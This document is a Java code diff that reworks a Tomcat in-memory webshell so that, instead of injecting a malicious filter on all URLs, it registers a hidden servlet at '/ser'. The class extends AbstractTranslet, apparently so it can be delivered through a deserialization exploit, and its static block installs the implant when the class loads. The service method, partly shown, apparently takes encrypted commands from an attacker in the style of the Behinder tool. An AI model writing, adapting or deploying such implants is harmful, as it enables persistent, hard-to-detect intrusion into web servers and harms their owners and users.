@@ -5,15 +5,13 @@ import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-import org.apache.catalina.Context;
+import org.apache.catalina.Wrapper;
 import org.apache.catalina.connector.Request;
 import org.apache.catalina.connector.RequestFacade;
 import org.apache.catalina.connector.ResponseFacade;
-import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.ApplicationServletRegistration;
 import org.apache.catalina.core.StandardContext;
 import org.apache.catalina.loader.WebappClassLoaderBase;
-import org.apache.tomcat.util.descriptor.web.FilterDef;
-import org.apache.tomcat.util.descriptor.web.FilterMap;
 import org.apache.tomcat.util.http.Parameters;
 
 import javax.crypto.Cipher;
@@ -23,56 +21,31 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
 import java.io.IOException;
-import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.*;
 
-public class TomcatFilterMemShellFromThread extends AbstractTranslet implements Filter {
+public class TomcatServletMemShellFromThread extends AbstractTranslet implements Servlet {
     static {
         try {
-            final String name = "MyFilterVersion" + System.nanoTime();
-            final String URLPattern = "/*";
+            String servrletName = "MyServletVersion" + System.nanoTime();
+            String urlPattern = "/ser";
 
-            WebappClassLoaderBase webappClassLoaderBase =
-                (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            // 获取 standardContext
+            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
             StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
 
-            Class<? extends StandardContext> aClass = null;
-            try {
-                aClass = (Class<? extends StandardContext>) standardContext.getClass().getSuperclass();
-                aClass.getDeclaredField("filterConfigs");
-            } catch (Exception e) {
-                aClass = (Class<? extends StandardContext>) standardContext.getClass();
-                aClass.getDeclaredField("filterConfigs");
+            if (standardContext.findChild(servrletName) == null) {
+                Wrapper wrapper = standardContext.createWrapper();
+                wrapper.setName(servrletName);
+                standardContext.addChild(wrapper);
+                Servlet servlet = new TomcatServletMemShellFromThread();
+
+                wrapper.setServletClass(servlet.getClass().getName());
+                wrapper.setServlet(servlet);
+                ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
+                registration.addMapping(urlPattern);
             }
-            Field Configs = aClass.getDeclaredField("filterConfigs");
-            Configs.setAccessible(true);
-            Map filterConfigs = (Map) Configs.get(standardContext);
-
-            TomcatFilterMemShellFromThread behinderFilter = new TomcatFilterMemShellFromThread();
-
-            FilterDef filterDef = new FilterDef();
-            filterDef.setFilter(behinderFilter);
-            filterDef.setFilterName(name);
-            filterDef.setFilterClass(behinderFilter.getClass().getName());
-            /**
-             * 将filterDef添加到filterDefs中
-             */
-            standardContext.addFilterDef(filterDef);
-
-            FilterMap filterMap = new FilterMap();
-            filterMap.addURLPattern(URLPattern);
-            filterMap.setFilterName(name);
-            filterMap.setDispatcher(DispatcherType.REQUEST.name());
-
-            standardContext.addFilterMapBefore(filterMap);
-
-            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
-            constructor.setAccessible(true);
-            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
-
-            filterConfigs.put(name, filterConfig);
         } catch (Exception e) {
 //            e.printStackTrace();
         }
@@ -89,12 +62,17 @@ public class TomcatFilterMemShellFromThread extends AbstractTranslet implements 
     }
 
     @Override
-    public void init(FilterConfig filterConfig) throws ServletException {
+    public void init(ServletConfig servletConfig) throws ServletException {
 
     }
 
     @Override
-    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+    public ServletConfig getServletConfig() {
+        return null;
+    }
+
+    @Override
+    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
         HttpServletRequest request = (HttpServletRequest) servletRequest;
         HttpServletResponse response = (HttpServletResponse) servletResponse;
         try {
@@ -190,12 +168,15 @@ public class TomcatFilterMemShellFromThread extends AbstractTranslet implements 
                 } else {
                     ((ResponseFacade) lastResponse).getWriter().println("error");
                 }
-                return;
             }
         } catch (Exception e) {
 //            e.printStackTrace();
         }
-        filterChain.doFilter(servletRequest, servletResponse);
+    }
+
+    @Override
+    public String getServletInfo() {
+        return null;
     }
 
     @Override
